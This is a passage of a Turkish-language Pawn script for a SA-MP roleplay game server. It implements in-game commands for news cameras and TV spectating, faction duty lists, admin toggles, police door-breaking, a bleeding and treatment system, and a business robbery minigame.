			RemovePlayerAttachedObject(playerid , 8);
			RemovePlayerAttachedObject(playerid , 9);
			gKameraKurdu[playerid] = 0;
			Bilgi(playerid, "Kamerayý kaldýrdýnýz.");
	        return 1;
	    }
	    Bilgi(playerid, "Kamerayý kaldýrdýnýz.");
	    DestroyDynamicObject(gKamera[playerid][0]);
	    DestroyDynamicObject(gKamera[playerid][1]);
	    DestroyDynamicObject(gKamera[playerid][2]);
	    DestroyDynamicObject(gKamera[playerid][3]);
	    gKameraKurdu[playerid] = 0;
	    foreach(new i : Player)
	    {
	        if(GetPVarInt(i, "IzledigiKameraman") == playerid) {
                TogglePlayerSpectating(i, false);
			    gTvIzliyo[i] = false;
				DONDUR(i);
				SetPlayerPos(i, gTx[playerid], gTy[playerid], gTz[playerid]);
				SetPlayerInterior(i, gTint[playerid]);
				SetPlayerVirtualWorld(i, gTvw[playerid]);
				SetCameraBehindPlayer(i);
				COZ(i);
				DeletePVar(i, "IzledigiKameraman");
			}
	    }
	}
	return 1;
}

CMD:ckamerabakisacisi(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != SANTV) return 1;
	if(Karakter[playerid][rutbe] < 5 && Birlik[Karakter[playerid][birlik]][ftip] == SANTV) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
	if(!gKameraKurdu[playerid]) return Hata(playerid, "Kamera kurmamýþsýnýz.");
	Bilgi(playerid, "Kamera bakýþ açýsý ayarladýnýz.");
	GetPlayerPos(playerid, gKameraPos[playerid][0], gKameraPos[playerid][1], gKameraPos[playerid][2]);
	return 1;
}

CMD:tvizle(playerid, params[])
{
    if(GetPlayerInterior(playerid) == 0 && !gTvIzliyo[playerid]) return Hata(playerid, "Burda televizyon izleyemezsiniz.");
    if(gTvIzliyo[playerid])
	{
	    if(!GetPVarInt(playerid, "OyuncuKameraTimer")) {
            KillTimer(GetPVarInt(playerid, "OyuncuKameraTimer"));
		}
	    IzleyenSayisi[GetPVarInt(playerid, "IzledigiKameraman")]--;
	    TogglePlayerSpectating(playerid, false);
	    gTvIzliyo[playerid] = false;
		DONDUR(playerid);
		SetPlayerPos(playerid, gTx[playerid], gTy[playerid], gTz[playerid]);
		SetPlayerInterior(playerid, gTint[playerid]);
		SetPlayerVirtualWorld(playerid, gTvw[playerid]);
		SetCameraBehindPlayer(playerid);
		SetTimerEx("CozEvladim", 3000, 0, "i", playerid);
		DeletePVar(playerid, "IzledigiKameraman");
		return 1;
	}
	new mstring[1024];
	foreach(new i : Player) {
		if(gKameraKurdu[i] != 0) {
			format(mstring, sizeof(mstring), "%s"NOKTA" %s\t "C2"%d\t "C1"%s\n", mstring, Birlik[Karakter[i][birlik]][fisim], IzleyenSayisi[i], OyuncuAdiniBul(i));
		}
 	}
 	if(isnull(mstring)) return Hata(playerid, "Þuanda bir canlý yayýn mevcut deðil.");
 	format(mstring, sizeof(mstring), " Kanal\t Ýzleyen Sayýsý\t Kameraman\n%s",mstring);
 	ShowPlayerDialog(playerid, 425, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"TV Ýzle", mstring, "Ýzle", "Ýptal");
	return 1;
}

CMD:gorevde(playerid)
{
	if(!Girdi[playerid]) return 1;
	new _say[10];
	_say[0] = 0;
	_say[1] = 0;
	_say[2] = 0;
	_say[3] = 0;
	_say[4] = 0;
	_say[5] = 0;
	_say[6] = 0;
	_say[7] = 0;
	_say[8] = 0;
	_say[9] = 0;
	foreach(new i : Player)
	{
	    if(Karakter[i][isbasi] && Birlik[Karakter[i][birlik]][ftip] == LSPD) _say[0]++;
	    if(Karakter[i][sisbasi]) _say[1]++;
	    if(Karakter[i][medisbasi]) _say[2]++;
	    if(Karakter[i][tester]) _say[3]++;
	    if(aDuty[i]) _say[4]++;
	    if(Karakter[i][adminlevel] > 0 && Karakter[i][adminlevel] < 7) _say[5]++;
	    if(tisbasi[i] == 1) _say[6]++;
	    if(Karakter[i][fdisbasi]) _say[7]++;
	    if(Karakter[i][mekisbasi] == 1) _say[8]++;
	    if(Karakter[i][avukat] > 0) _say[9]++;
	}
	SendClientMessage(playerid, -1, ""C2"Görevdekiler:");
	SendClientMessageEx(playerid, -1, "%d "C2"AVUKAT (/avaktif)",_say[9]);
	SendClientMessageEx(playerid, -1, "%d "C2"TAKSÝCÝ (/taktif)",_say[6]);
	SendClientMessageEx(playerid, -1, "%d "C2"MEKANÝK (/maktif)",_say[8]);
	SendClientMessageEx(playerid, -1, "%d "C2"LSPD",_say[0]);
	SendClientMessageEx(playerid, -1, "%d "C2"BASIN",_say[1]);
	SendClientMessageEx(playerid, -1, "%d "C2"LSMD",_say[2]);
	SendClientMessageEx(playerid, -1, "%d "C2"LSFD",_say[7]);
	SendClientMessageEx(playerid, -1, "%d "C2"TESTER",_say[3]);
	SendClientMessageEx(playerid, -1, "%d "C2"ADMIN ("C1"%d "C2"AWORK)",_say[5],_say[4]);
	return 1;
}

CMD:isim(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	return Hata(playerid, "Ýnaktif!");
	/*new nstring[10];
	if(sscanf(params,"s[10]",nstring)) return Kullanim(playerid, "/isim [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: goster, gizle");
	if(Buysa(nstring,"goster"))
	{
	    foreach(new i : Player)
		{
	    	ShowPlayerNameTagForPlayer(playerid, i, true);
		}
		Bilgi(playerid, "Ýsimleri görüyorsunuz.");
	}
	else if(Buysa(nstring,"gizle"))
	{
	    foreach(new i : Player)
		{
	    	ShowPlayerNameTagForPlayer(playerid, i, false);
		}
		Bilgi(playerid, "Ýsimleri gizlediniz.");
	}
	else return Kullanim(playerid, "/isim [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: goster, gizle");
	return 1;*/
}

CMD:pickupgetir(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][adminlevel] < 4) return 1;
	foreach(new i : Business)
	{
	    IsyeriKaydet(i);
	    IsyeriAyarla(i);
	}
	foreach(new i : Houses)
	{
	    EvKaydet(i);
	    DestroyColouredCheckpoint(Ev[i][ecp]);
		EvAyarla(i);
	}
	foreach(new i : Player)
 	{
		new string2[50];
    	format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(i), i);
		UpdateDynamic3DTextLabelText(tanismaIsim[i], GetPlayerColor(i), string2);
	}
	Bilgi(playerid, "Pickuplar getirildi.");
	return 1;
}

CMD:rutbegetir(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][adminlevel] < 4) return 1;
	for(new i = 0; i < MAX_PLAYERS; i++)
    {
        tanismaIsim[i] = CreateDynamic3DTextLabel("isim", COLOR_WHITE, 0.0, 0.0, 0.099, 15.0, i, .testlos=1);
        tanismaHP[i] = CreateDynamic3DTextLabel("hpbar", 0x00B900FF, 0.0, 0.0, 0.010, 15.0, i, .testlos=1);
    	gRutbeIsim[i] = CreateDynamic3DTextLabel("", 0x8D8DFFFF, 0, 0, 0.30, 15, i, .testlos=1);
    	aworkIsim[i] = CreateDynamic3DTextLabel("", 0x800000FF, 0, 0, 0.30, 15, i, .testlos=1);
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
    {
			new targetrank[32];
			switch(Karakter[i][rutbe])
			{
				case 0: targetrank = "Sivil";
				case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe1]);
				case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe2]);
				case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe3]);
			   	case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe4]);
			    case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe5]);
			    case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe6]);
				case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe7]);
				case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe8]);
				case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe9]);
				case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe10]);
				case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe11]);
				case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe12]);
				case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe13]);
				case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe14]);
				case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe15]);
				case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe16]);
				case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe17]);
				case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe18]);
				case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe19]);
				case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe20]);
			}
			format(targetrank, 32, "[%s]", targetrank);
			if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)) UpdateDynamic3DTextLabelText(gRutbeIsim[i], 0x8D8DFFFF, targetrank);
            if((Birlik[Karakter[i][birlik]][ftip] == ASMS && Karakter[i][medisbasi] == 1)) UpdateDynamic3DTextLabelText(gRutbeIsim[i], COLOR_LSMC, targetrank);
            if((Birlik[Karakter[i][birlik]][ftip] == LSFD && Karakter[i][fdisbasi] == 1)) UpdateDynamic3DTextLabelText(gRutbeIsim[i], COLOR_LSFD, targetrank);
            if((Birlik[Karakter[i][birlik]][ftip] == SANTV && Karakter[i][sisbasi] == 1)) UpdateDynamic3DTextLabelText(gRutbeIsim[i], COLOR_SANTV, targetrank);
    }
	Bilgi(playerid, "Rütbeler getirildi.");
	return 1;
}

CMD:rutbesil(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][adminlevel] < 4) return 1;
	for(new i = 0; i < MAX_PLAYERS; i++)
    {
        DestroyDynamic3DTextLabel(gRutbeIsim[i]);
        DestroyDynamic3DTextLabel(aworkIsim[i]);
	}
	Bilgi(playerid, "Rütbeler silindi.");
	return 1;
}

CMD:kapikir(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD) return Hata(playerid, "LSPD görevlisi deðilsiniz.");
	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][rutbe] > 12) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
	foreach(new i : Business)
	{
	    if(PlayerToPoint(3.0, playerid, Isyeri[i][girisX], Isyeri[i][girisY], Isyeri[i][girisZ]))
		{
	    	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][igirisvw])
	        {
	            if(Isyeri[i][isahip] == -1) return Hata(playerid, "Bu iþyerinin sahibi bulunmamaktadýr.");
	            if(!Isyeri[i][ikilit]) return Hata(playerid, "Ýþyeri kilitli deðil.");
				Bilgi(playerid, "Kapýyý kýrýyorsunuz.");
				DONDUR(playerid);
				SetPVarInt(playerid, "KapiKir", 25);
				SetPVarInt(playerid, "KapiID", i);
				SetPVarInt(playerid, "KapiTip", 2);
				PlayerTextDrawShow(playerid, GeriSayimTD[playerid]);
	        	PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], "20");
				return 1;
	        }
		}
 	}
 	foreach(new ev : Houses)
	{
	    if(PlayerToPoint(3.0, playerid, Ev[ev][girisX], Ev[ev][girisY], Ev[ev][girisZ]))
		{
	    	if(GetPlayerVirtualWorld(playerid) == Ev[ev][egirisvw])
	        {
	            if(Ev[ev][esahip] == -1) return Hata(playerid, "Bu evin sahibi bulunmamaktadýr.");
	            if(!Ev[ev][ekilit]) return Hata(playerid, "Ev kilitli deðil.");
				Bilgi(playerid, "Kapýyý kýrýyorsunuz.");
				DONDUR(playerid);
				SetPVarInt(playerid, "KapiKir", 20);
				SetPVarInt(playerid, "KapiID", ev);
				SetPVarInt(playerid, "KapiTip", 1);
				PlayerTextDrawShow(playerid, GeriSayimTD[playerid]);
	        	PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], "20");
				return 1;
	        }
		}
	}
	return 1;
}

stock SetPlayerBleeding(playerid, bleeds = MAX_PLAYER_BLEEDS)
{
	if(IsPlayerBleeding(playerid))
		return false;
	if(bleeds < 1)					bleeds	=					1;
	if(bleeds > MAX_PLAYER_BLEEDS)	bleeds	=	MAX_PLAYER_BLEEDS;
	Karakter[playerid][kanama] = bleeds;
	SagAltGoster(playerid, 2);
	new
			Float:pos[3];
	GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
	for(new a = 0; a < bleeds; a++)
	{
		GetXYInFrontOfPlayerEx(playerid, pos[0], pos[1], -(PLAYER_BLEEDING_RANGE * a));
		PlayerData[playerid][BleedObject][a] = CreateDynamicObject(
			19836,
			pos[0],
			pos[1],
			(pos[2] - 0.99),
			0.0,
			0.0,
			0.0,
			GetPlayerVirtualWorld(playerid),
			GetPlayerInterior(playerid),
			-1,
			50.0
		);
	}
	return true;
}

stock UpdatePlayerBleeds(playerid)
{
	if(IsPlayerFalling(playerid) || IsPlayerJumping(playerid) || IsPlayerInWater(playerid))
		return false;
	new
			Float:pos[3];
	GetDynamicObjectPos(PlayerData[playerid][BleedObject][0], pos[0], pos[1], pos[2]);
	if(!IsPlayerInRangeOfPoint(playerid, PLAYER_BLEEDING_RANGE, pos[0], pos[1], (pos[2] + 0.99)))
	{
		new
				a = (Karakter[playerid][kanama] - 1);
		while(a >= 0)
		{
			if((a - 1) == -1)
			{
				GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
				pos[2] -= 0.99;
			}
			else if(IsValidDynamicObject(PlayerData[playerid][BleedObject][a - 1]) && IsValidDynamicObject(PlayerData[playerid][BleedObject][a])) {
				GetDynamicObjectPos(PlayerData[playerid][BleedObject][a - 1], pos[0], pos[1], pos[2]);
				SetDynamicObjectPos(PlayerData[playerid][BleedObject][a], pos[0], pos[1], pos[2]);
				if(GetPlayerInterior(playerid) != Streamer_GetIntData(STREAMER_TYPE_OBJECT, PlayerData[playerid][BleedObject][a], E_STREAMER_INTERIOR_ID))
					Streamer_SetIntData(STREAMER_TYPE_OBJECT, PlayerData[playerid][BleedObject][a], E_STREAMER_INTERIOR_ID, GetPlayerInterior(playerid));
				if(GetPlayerVirtualWorld(playerid) != Streamer_GetIntData(STREAMER_TYPE_OBJECT, PlayerData[playerid][BleedObject][a], E_STREAMER_WORLD_ID))
					Streamer_SetIntData(STREAMER_TYPE_OBJECT, PlayerData[playerid][BleedObject][a], E_STREAMER_WORLD_ID, GetPlayerVirtualWorld(playerid));
			}
			a--;
		}
	}
	return true;
}

stock StopPlayerBleeding(playerid)
{
	if(!IsPlayerBleeding(playerid))
		return false;
	for(new a = 0; a < Karakter[playerid][kanama]; a++)
	{
		if(IsValidDynamicObject(PlayerData[playerid][BleedObject][a]))
		{
			DestroyDynamicObject(PlayerData[playerid][BleedObject][a]);
			PlayerData[playerid][BleedObject][a] = INVALID_OBJECT_ID;
		}
	}
	Karakter[playerid][kanama] = 0;
	SagAltGoster(playerid, 1);
	return true;
}

stock IsPlayerBleeding(playerid)
	return Karakter[playerid][kanama];

stock IsPlayerFalling(playerid)
{
	new
			animation[32];
	GetAnimationName(
		GetPlayerAnimationIndex(playerid),
		animation,
		0,
		animation,
		32
	);
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT
	&& (!strcmp(animation, "FALL_FALL", true) || !strcmp(animation, "FALL_GLIDE", true)))
		return true;
	return false;
}

stock IsPlayerJumping(playerid)
{
	new
			animation[32];
	GetAnimationName(
		GetPlayerAnimationIndex(playerid),
		animation,
		0,
		animation,
		32
	);
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT
	&& (!strcmp(animation, "JUMP_LAUNCH", true) || !strcmp(animation, "JUMP_GLIDE", true)))
		return true;
	return false;
}

stock IsPlayerSwimming(playerid)
{
    return (1538 <= GetPlayerAnimationIndex(playerid) <= 1544);
}

stock IsPlayerInWater(playerid)
{
	if(GetPlayerInterior(playerid) || GetPlayerVirtualWorld(playerid))
		return false;
	new
			Float:pos;
	GetPlayerPos(playerid, pos, pos, pos);
	if(!(pos < 1.0))
		return false;
	return true;
}

CMD:ilkyardim(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD) {
	if((Birlik[Karakter[playerid][birlik]][ftip] == ASMS && Karakter[playerid][medisbasi] == 0) || (Birlik[Karakter[playerid][birlik]][ftip] == LSFD && Karakter[playerid][fdisbasi] == 0)) return 1;
	new _pid;
	if(sscanf(params,"i",_pid)) return Kullanim(playerid, "/ilkyardim [oyuncuID]");
	if(!Girdi[_pid]) return Hata(playerid, "Oyuncu oyunda deðil.");
	if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
 	Bilgi(playerid, "Oyuncuyu iyileþtirdiniz.");
	Karakter[_pid][kanama] = 0;
	SetPVarInt(_pid, "Yarali", 1);
	ResetDamages(playerid);
 	if(IsPlayerBleeding(_pid)) StopPlayerBleeding(_pid); }
	return 1;
}

CMD:tedavi(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD) {
	if((Birlik[Karakter[playerid][birlik]][ftip] == ASMS && Karakter[playerid][medisbasi] == 0) || (Birlik[Karakter[playerid][birlik]][ftip] == LSFD && Karakter[playerid][fdisbasi] == 0)) return 1;
	new _pid;
	if(sscanf(params,"i",_pid)) return Kullanim(playerid, "/tedavi [oyuncuID]");
	if(!Girdi[_pid]) return Hata(playerid, "Oyuncu oyunda deðil.");
	if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
	Bilgi(playerid, "Oyuncuyu tedavi ettiniz.");
	Bilgi(_pid, "Tedavi edildiniz.");
	SetPlayerHealth(_pid, 100);
	ResetDamages(_pid);
	if(IsPlayerBleeding(_pid)) StopPlayerBleeding(_pid); }
	return 1;
}

CMD:a2xpayday(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][adminlevel] < 4) return 1;
	switch(g2xpayday)
	{
	    case 0:
	    {
	        g2xpayday = true;
	        Bilgi(playerid, "2X Payday açtýnýz.");
	    }
	    case 1:
	    {
	        g2xpayday = false;
	        Bilgi(playerid, "2X Payday kapadýnýz.");
	    }
	}
	return 1;
}

CMD:aantiafk(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][adminlevel] < 6) return 1;
	switch(gantiafk)
	{
	    case 0:
	    {
	        gantiafk = true;
	        Bilgi(playerid, "Anti AFK açtýnýz.");
	    }
	    case 1:
	    {
	        gantiafk = false;
	        Bilgi(playerid, "Anti AFK kapadýnýz.");
	    }
	}
	return 1;
}

CMD:apiyango(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][adminlevel] < 6) return 1;
	switch(gPiyango)
	{
	    case 0:
	    {
	        gPiyango = true;
	        Bilgi(playerid, "Piyango satýþlarýný açtýnýz.");
	    }
	    case 1:
	    {
	        gPiyango = false;
	        Bilgi(playerid, "Piyango satýþlarýný kapadýnýz.");
	    }
	}
	return 1;
}

CMD:hapisliste(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != LSPD) return 1;
	SendClientMessage(playerid, -1, ""C2"Hapistekiler:");
	foreach(new i : Player)
	{
	    if(Karakter[i][kodes] > 0)
	    {
	        SendClientMessageEx(playerid, -1, "%s Süre: %d dk",OyuncuAdiniBul(i), Karakter[i][kodes]);
		}
	}
	return 1;
}

CMD:ahapisliste(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 1) return 1;
	SendClientMessage(playerid, -1, ""C2"Hapistekiler:");
	foreach(new i : Player)
	{
	    if(Karakter[i][kodes] > 0)
	    {
	        SendClientMessageEx(playerid, -1, "%s Süre: %d dk",OyuncuAdiniBul(i), Karakter[i][kodes]);
		}
	}
	return 1;
}

CMD:pdrutbe(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != LSPD) return 1;
	if(Karakter[playerid][rutbe] > 15) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
	new nstring[12];
	if(sscanf(params,"s[12]",nstring)) return Kullanim(playerid, "/pdrutbe [fonksiyon]"),SendClientMessage(playerid, -1,"Geçerli fonksiyonlar: goster, gizle");
	if(Buysa(nstring,"goster"))
	{
	    Bilgi(playerid, "Rütbeniz gösteriliyor.");
     	new targetrank[32];
		switch(Karakter[playerid][rutbe])
		{
			case 0: targetrank = "Sivil";
			case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
			case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
			case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
		   	case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
		    case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
		    case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
			case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
			case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
			case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
			case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
			case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
			case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
			case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
			case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
			case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
			case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
			case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
			case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
			case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
			case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
		}
		format(targetrank, 32, "[%s]", targetrank);
		UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], 0x8D8DFFFF, targetrank);
	}
	else if(Buysa(nstring,"gizle"))
	{
	    Bilgi(playerid, "Rütbeniz gizlendi.");
     	UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], 0x8D8DFFFF, "");
	}
	return 1;
}

CMD:tedaviol(playerid)
{
	if(!Girdi[playerid]) return 1;
	if(!TedaviPos(playerid)) return Hata(playerid, "Tedavi olma yerinde deðilsiniz.");
	if(GetPlayerCash(playerid) < 350) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
	Bilgi(playerid, "Tedavi oldunuz.");
	if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != FBI && Birlik[Karakter[playerid][birlik]][ftip] != ASMS && Birlik[Karakter[playerid][birlik]][ftip] != LSFD) GivePlayerCash(playerid, -350);
	SetPlayerHealth(playerid, 100);
	ResetDamages(playerid);
	if(IsPlayerBleeding(playerid)) StopPlayerBleeding(playerid);
	return 1;
}

TedaviPos(playerid)
{
    if(IsPlayerInRangeOfPoint(playerid, 5, 148.1660,959.1906,934.7672)) return 1;
	if(IsPlayerInRangeOfPoint(playerid, 5, Veriler[ekipmanX], Veriler[ekipmanY], Veriler[ekipmanZ]) && Birlik[Karakter[playerid][birlik]][ftip] == LSPD) return 1;
	return 0;
}

CMD:soygun(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][level] < 5) return Hata(playerid, "Soygun baþlatmak için 5 level üzeri olmalýsýnýz.");
	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD) return Hata(playerid, "Soygun yapamazsýnýz.");
   	foreach(new i : Business)
 	{
 		if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
        {
            if(Isyeri[i][isahip] == Karakter[playerid][sqlid] || Isyeri[i][kiralayan] == Karakter[playerid][sqlid] || Isyeri[i][ortak] == Karakter[playerid][sqlid]) return Hata(playerid, "Soygun yapamazsýnýz.");
	    	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
	        {
	            if(Isyeri[i][itip] != 1 && Isyeri[i][itip] != 2 && Isyeri[i][itip] != 3 && Isyeri[i][itip] != 4 && Isyeri[i][itip] != 5) return Hata(playerid, "Bir iþyerinin içerisinde deðilsiniz.");
	            for(new idx;idx<MAX_SOYGUN;idx++)
	            {
	                if(Soygun[idx][isyerid] == i)
	                {
	                    if(Soygun[idx][lider] == playerid) return SoygunMenu(playerid);
	                }
	            }
	            if(IsyeriSoyuluyor[i]) return Hata(playerid, "Bu iþyeri þuan soyuluyor.");
	            new sure=gettime();
             	if(sure-Karakter[playerid][soygunsure] < 86400) return Hata(playerid, "Günde bir soygun yapabilirsiniz.");
	            SetPVarInt(playerid, "SoygunID", playerid);
				Soygun[playerid][lider] = playerid;
				Soygun[playerid][oyuncu2] = -1;
				Soygun[playerid][oyuncu3] = -1;
				Soygun[playerid][oyuncu4] = -1;
				Soygun[playerid][oyuncu5] = -1;
                Soygun[playerid][isyerid] = i;
                Soygun[playerid][isyeritip] = Isyeri[i][itip];
				IsyeriSoyuluyor[i] = true;
	            SoygunMenu(playerid);
	            SoygunTextGoster(playerid);
	        	return 1;
			}
		}
	}
	Hata(playerid, "Bir iþyerinin içerisinde deðilsiniz.");
	return 1;
}

SoygunMenu(playerid)
{
	new _kisi=1;
	if(Soygun[playerid][oyuncu2] != -1) _kisi++;
	if(Soygun[playerid][oyuncu3] != -1) _kisi++;
	if(Soygun[playerid][oyuncu4] != -1) _kisi++;
	if(Soygun[playerid][oyuncu5] != -1) _kisi++;
	new mstring[512];
	format(mstring ,sizeof(mstring), ""C1"Soyguna\t "C2"Kiþi Al/At\t ("C1"%d/5"C2")\n"C1"Soygun\t "C2"Baþlat\t ("C1"75 saniye"C2")\n"C1"Soygun\t "C2"Ýptal Et", _kisi);
	return ShowPlayerDialog(playerid, 330, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Soygun", mstring, "Seç", "Ýptal");
}

SoygunTextGoster(playerid)
{
	SoygunTextDrawYukle(playerid);
	new _id = GetPVarInt(playerid, "SoygunID");
	for(new i;i<5;i++)
	{
    	PlayerTextDrawShow(playerid, SoygunBox[playerid][i]);
 	}
	new _name[32];
 	GetPlayerName(Soygun[_id][lider], _name, 32);
	for(new i;i<32;i++)
	{
		if(_name[i] == '_')
		{
		    strdel(_name, i, strlen(_name));
		}
	}
 	format(_name, sizeof(_name), "(%d)%s",Soygun[_id][lider],_name);
 	PlayerTextDrawSetString(playerid, OyuncuIsim[playerid][0], _name);
 	PlayerTextDrawSetString(playerid, OyuncuLevel[playerid][0], Karakter[Soygun[_id][lider]][level]);
 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][0], Karakter[Soygun[_id][lider]][skin]);
 	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][0], SilahObje(GetPlayerWeapon(Soygun[_id][lider])));
 	PlayerTextDrawShow(playerid, OyuncuSkin[playerid][0]);
 	PlayerTextDrawShow(playerid, OyuncuSilahTD[playerid][0]);
 	PlayerTextDrawShow(playerid, OyuncuLevel[playerid][0]);
 	PlayerTextDrawShow(playerid, OyuncuIsim[playerid][0]);
 	SoygunTextTimer[playerid] = SetTimerEx("SoygunTextGuncelle", 1000, true, "i", playerid);
}

forward SoygunTextGuncelle(playerid);
public SoygunTextGuncelle(playerid)
{
	new _id = GetPVarInt(playerid, "SoygunID");
	if(Soygun[_id][oyuncu2] == -1)
	{
	    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][1]);
    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][1]);
    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][1]);
    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][1]);
	}
	if(Soygun[_id][oyuncu3] == -1)
	{
	    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][2]);
    	PlayerTextDrawHide(playerid, OyuncuLevel[playerid][2]);
    	PlayerTextDrawHide(playerid, OyuncuIsim[playerid][2]);
    	PlayerTextDrawHide(playerid, OyuncuSkin[playerid][2]);
	}
	if(Soygun[_id][oyuncu4] == -1)
	{
	    PlayerTextDrawHide(playerid, OyuncuSilahTD[playerid][3]);
